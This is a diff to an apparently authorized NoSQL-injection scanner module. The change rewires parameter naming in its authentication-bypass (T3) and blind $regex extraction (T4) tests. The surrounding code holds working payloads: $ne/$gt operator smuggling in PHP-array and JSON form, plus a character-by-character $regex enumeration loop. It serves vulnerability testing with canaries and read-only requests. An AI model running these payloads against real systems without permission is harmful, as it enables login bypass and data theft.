@@ -17,6 +17,7 @@
 // Depth: Quick = T3 only; Standard = T3 (+T4 capped when canary present);
 // Deep = full battery + T5. Read-only HTTP, per-run canaries, redirects
 // never followed, $0 AI.
+import { probePointName, probePointParameter } from '../probePoints.js';
 
 const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
 
@@ -106,22 +107,22 @@ function ev(request, response, impact) {
 // T3 — operator auth bypass (differential, CRITICAL).
 async function t3Bypass(url, params, opts) {
   const findings = [];
-  const up = params.find((p) => /user|login|name|mail/i.test(p)) || params[0];
-  const pp = params.find((p) => /pass|pwd/i.test(p)) || params[1] || 'password';
+  const up = params.find((p) => /user|login|name|mail/i.test(probePointName(p))) || params[0];
+  const pp = params.find((p) => /pass|pwd/i.test(probePointName(p))) || params[1] || 'password';
   if (!up) return findings;
   const wrongU = `zz_${rand()}`;
   const wrongP = `wrong_${rand()}`;
   let rPlain;
   try {
-    rPlain = await postForm(url, { [up]: wrongU, [pp]: wrongP }, opts);
+    rPlain = await postForm(url, { [probePointName(up)]: wrongU, [probePointName(pp)]: wrongP }, opts);
   } catch {
     return findings;
   }
   const plainAuthed = authed(rPlain);
   // Operator variants: PHP array syntax + JSON operator smuggling.
   const variants = [
-    { kind: 'php-ne', fields: { [`${up}[$ne]`]: '1', [`${pp}[$ne]`]: '1' } },
-    { kind: 'php-gt', fields: { [`${up}[$gt]`]: '', [`${pp}[$gt]`]: '' } },
+    { kind: 'php-ne', fields: { [`${probePointName(up)}[$ne]`]: '1', [`${probePointName(pp)}[$ne]`]: '1' } },
+    { kind: 'php-gt', fields: { [`${probePointName(up)}[$gt]`]: '', [`${probePointName(pp)}[$gt]`]: '' } },
   ];
   for (const v of variants) {
     let r;
@@ -137,7 +138,7 @@ async function t3Bypass(url, params, opts) {
         title: 'NoSQL injection — authentication bypass via query operators (CRITICAL)',
         severity: 'critical',
         url,
-        parameter: `${up},${pp}`,
+        parameter: `${probePointName(up)},${probePointName(pp)}`,
         evidence: ev(
           `POST ${url} ${v.kind}: ${Object.keys(v.fields).join('&')} (redirects NOT followed)`,
           `Plain wrong credentials (${wrongU}): NOT authenticated. Operator variant (${v.kind}): authenticated — ${authSignal(r)}. Differential holds — the bypass comes from operator parsing, not loose comparison.`,
@@ -151,7 +152,7 @@ async function t3Bypass(url, params, opts) {
   try {
     const rj = await postJson(
       url,
-      { [up]: { $ne: null }, [pp]: { $ne: null } },
+      { [probePointName(up)]: { $ne: null }, [probePointName(pp)]: { $ne: null } },
       opts
     );
     if (!plainAuthed && authed(rj, rPlain.setCookie)) {
@@ -161,9 +162,9 @@ async function t3Bypass(url, params, opts) {
         title: 'NoSQL injection — JSON operator authentication bypass (CRITICAL)',
         severity: 'critical',
         url,
-        parameter: `${up},${pp}`,
+        parameter: `${probePointName(up)},${probePointName(pp)}`,
         evidence: ev(
-          `POST ${url} Content-Type: application/json {"${up}":{"$ne":null},"${pp}":{"$ne":null}} (redirects NOT followed)`,
+          `POST ${url} Content-Type: application/json {"${probePointName(up)}":{"$ne":null},"${probePointName(pp)}":{"$ne":null}} (redirects NOT followed)`,
           `Plain wrong credentials: NOT authenticated. JSON $ne variant: authenticated — ${authSignal(rj)}. Differential holds.`,
           'Full authentication bypass via JSON operator smuggling.'
         ),
@@ -190,8 +191,8 @@ async function t4Regex(url, params, canary, opts) {
       const guess = extracted + ch;
       let rT, rF;
       try {
-        rT = await postJson(url, { [up]: { $regex: `^${guess}` } }, opts);
-        rF = await postJson(url, { [up]: { $regex: `^${guess}zzz${rand()}` } }, opts);
+        rT = await postJson(url, { [probePointName(up)]: { $regex: `^${guess}` } }, opts);
+        rF = await postJson(url, { [probePointName(up)]: { $regex: `^${guess}zzz${rand()}` } }, opts);
       } catch {
         break;
       }
@@ -216,9 +217,9 @@ async function t4Regex(url, params, canary, opts) {
       title: 'NoSQL injection — $regex blind extraction (HIGH)',
       severity: 'high',
       url,
-      parameter: up,
+      parameter: probePointParameter(up),
       evidence: ev(
-        `POST ${url} JSON {"${up}":{"$regex":"^<prefix>"}} anchored enumeration, impossible-suffix control per guess`,
+        `POST ${url} JSON {"${probePointName(up)}":{"$regex":"^<prefix>"}} anchored enumeration, impossible-suffix control per guess`,
         `Extracted "${extracted}" from our OWN canary field; ${match}/${extracted.length} chars match the known canary value "${value}". Self-verifying oracle.`,
         'Blind data-extraction primitive via NoSQL $regex operator — full field exfiltration channel.'
       ),
